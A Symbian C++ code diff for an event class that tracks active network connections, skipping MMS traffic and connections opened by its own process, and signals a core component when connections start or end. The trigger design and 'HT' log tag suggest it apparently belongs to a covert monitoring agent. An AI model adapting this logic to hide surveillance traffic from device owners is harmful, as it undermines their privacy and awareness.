@@ -7,8 +7,12 @@
 
 #include "EventConnection.h"
 
+#include <msvapi.h>
+#include <msvstd.h>
+#include <mmssettings.h>   //for CMmsSettings, retrieve mms access point
+
 CEventConnection::CEventConnection(TUint32 aTriggerId) :
-	CAbstractEvent(EEvent_Connection, aTriggerId),iConnCount(0)
+	CAbstractEvent(EEvent_Connection, aTriggerId)
 	{
 	// No implementation required
 	}
@@ -18,6 +22,7 @@ CEventConnection::~CEventConnection()
 	//__FLOG(_L("Destructor"));
 	iConnMon.CancelNotifications();
 	iConnMon.Close();
+	iActiveConnArray.Close();
 	//__FLOG(_L("End Destructor"));
 	//__FLOG_CLOSE;
 	} 
@@ -39,20 +44,33 @@ CEventConnection* CEventConnection::NewL(const TDesC8& params, TUint32 aTriggerI
 
 void CEventConnection::ConstructL(const TDesC8& params)
 	{
-	//__FLOG_OPEN_ID("HT", "EventBattery.txt");
+	//__FLOG_OPEN_ID("HT", "EventConnection.txt");
 	//__FLOG(_L("-------------"));
 	
 	BaseConstructL(params);
 	Mem::Copy(&iConnParams, iParams.Ptr(), sizeof(iConnParams));
 	
+	//retrieve configured mms access point
+	iMmsApId = 0;
+	CMmsSettings* mmsSettings;
+	mmsSettings = CMmsSettings::NewL();
+	CleanupStack::PushL(mmsSettings);
+	mmsSettings->LoadSettingsL();
+	iMmsApId = mmsSettings->AccessPoint( 0 );
+	CleanupStack::PopAndDestroy(mmsSettings);
+		
 	User::LeaveIfError(iConnMon.ConnectL());
+	
+	//retrieve my uid
+	RProcess me;
+	TUidType uidType=me.Type();
+	iMyUid = uidType[2];			// [0] = UID1, [1] = UID2, [3] = UID3
 	
 	}
 
 void CEventConnection::StartEventL()
 	{
 	// check for active connections
-	iConnCount = 0;
 	iWasConnected = EFalse;
 	
 	TUint connCount;
@@ -69,7 +87,7 @@ void CEventConnection::StartEventL()
 	TUint subConnCount;
 	TInt bearerType;  //TConnMonBearerType
 	
-	for(TUint i=0; i<connCount; i++)
+	for(TUint i=1; i<=connCount; i++) //index of GetConnectionInfo must start from 1!!!
 		{
 		TInt err = iConnMon.GetConnectionInfo(i,connId,subConnCount);
 		if(err != KErrNone)
@@ -77,12 +95,35 @@ void CEventConnection::StartEventL()
 			continue;
 			}
 		
-		//TODO: just testing
-		TBuf<32> apName;
-		iConnMon.GetStringAttribute(i,connId,KAccessPointName,apName,status);
+		//retrieve iapId and compare with mms iap
+		TBool isMmsConnection=EFalse;
+		TUint iapId;
+		iConnMon.GetUintAttribute(connId,0,KIAPId,iapId,status);
 		User::WaitForRequest(status);
-		//compare with mms
-		// finished testing
+		if(status.Int() == KErrNone)
+			{
+			if(iapId == iMmsApId)
+				{
+				isMmsConnection=ETrue;
+				}
+			}
+		
+		//retrieve uid of application using the connection
+		TBool isOurConnection = EFalse;
+		TConnMonClientEnumBuf buf;
+		iConnMon.GetPckgAttribute(connId,0,KClientInfo,buf,status);
+		User::WaitForRequest(status);
+		if (status.Int() == KErrNone ) 
+		    {
+			TUint clientCount = buf().iCount;  //number of clients
+			for ( TInt i = 0; i < clientCount; i++ )
+				{
+				TUid uid = buf().iUid[i];    //UID of the client
+				if(uid == iMyUid)
+					isOurConnection = ETrue;
+				}
+			}
+		 
 		
 		iConnMon.GetIntAttribute(connId,0,KBearer,bearerType,status);
 		User::WaitForRequest(status);
@@ -90,19 +131,21 @@ void CEventConnection::StartEventL()
 			{
 			continue;
 			}
-		if((bearerType >= EBearerWCDMA) && (bearerType <= EBearerWLAN));  //it was EBearerVirtualVPN
+		if((bearerType >= EBearerWCDMA) && (bearerType <= EBearerWLAN))
 			{
-			++iConnCount;
+			if((!isMmsConnection) && (!isOurConnection))
+				{
+				iActiveConnArray.Append(connId);
+				}
 			}
-	
 		}
-	if(iConnCount>0)
+	iConnMon.NotifyEventL(*this);
+		
+	if(iActiveConnArray.Count()>0)
 		{
 		iWasConnected = ETrue;
 		SendActionTriggerToCoreL();
 		}
-	
-	iConnMon.NotifyEventL(*this);
 	}
 
 void CEventConnection::EventL( const CConnMonEventBase& aEvent )
@@ -112,19 +155,51 @@ void CEventConnection::EventL( const CConnMonEventBase& aEvent )
         {
         case EConnMonCreateConnection:
             {
-            TInt bearerType;
             TRequestStatus status;
+            //retrieve iapId and compare with mms iap
+            TBool isMmsConnection=EFalse;
+            TUint iapId;
+            iConnMon.GetUintAttribute(aEvent.ConnectionId(),0,KIAPId,iapId,status);
+            User::WaitForRequest(status);
+            if(status.Int() == KErrNone)
+            	{
+            	if(iapId == iMmsApId)
+            		{
+            		isMmsConnection=ETrue;
+            		}
+            	}
+            
+            //retrieve uid of application using the connection
+            TBool isOurConnection = EFalse;
+            TConnMonClientEnumBuf buf;
+            iConnMon.GetPckgAttribute(aEvent.ConnectionId(),0,KClientInfo,buf,status);
+            User::WaitForRequest(status);
+            if (status.Int() == KErrNone ) 
+            	{
+            	TUint clientCount = buf().iCount;  //number of clients
+            	for ( TInt i = 0; i < clientCount; i++ )
+            		{
+            		TUid uid = buf().iUid[i];    //UID of the client
+            		if(uid == iMyUid)
+            			isOurConnection = ETrue;
+            		}
+            	}
+            		
+            TInt bearerType;
             iConnMon.GetIntAttribute(aEvent.ConnectionId(),0,KBearer,bearerType,status);
             User::WaitForRequest(status);
             if(status.Int() != KErrNone)
             	{
             	break;
             	}
-            if((bearerType >= EBearerWCDMA) && (bearerType <= EBearerVirtualVPN));
+            if((bearerType >= EBearerWCDMA) && (bearerType <= EBearerWLAN))
             	{
-            	++iConnCount;
+            	if(!isMmsConnection && !isOurConnection)
+            		{
+            		iActiveConnArray.Append(aEvent.ConnectionId());
+            		}
             	}
-            if( !iWasConnected && (iConnCount>0))
+            if(!iWasConnected && (iActiveConnArray.Count()>0))
             	{
 				iWasConnected = ETrue;
 				SendActionTriggerToCoreL();
@@ -133,8 +208,13 @@ void CEventConnection::EventL( const CConnMonEventBase& aEvent )
             }
         case EConnMonDeleteConnection:
             {
-            --iConnCount;
-            if( iWasConnected && (iConnCount == 0))
+            TInt pos;
+            if((pos=iActiveConnArray.Find(aEvent.ConnectionId())) != KErrNotFound)
+            	{
+            	iActiveConnArray.Remove(pos);
+            	}
+            
+            if(iWasConnected && (iActiveConnArray.Count()==0))
             	{
             	iWasConnected = EFalse;
             	if (iConnParams.iExitAction != 0xFFFFFFFF)
